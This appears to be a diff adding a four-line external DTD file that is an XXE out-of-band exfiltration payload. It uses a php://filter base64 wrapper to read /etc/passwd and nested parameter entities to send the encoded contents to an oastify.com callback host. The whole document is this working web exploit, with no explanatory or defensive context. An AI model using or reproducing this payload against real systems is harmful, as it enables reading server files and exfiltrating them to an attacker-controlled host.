@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://x9p2m6v1r4n4b3z7k5t0w2q6j1s9a4l.oastify.com/?data=%file;'>">
+%eval;
+%exfiltrate;
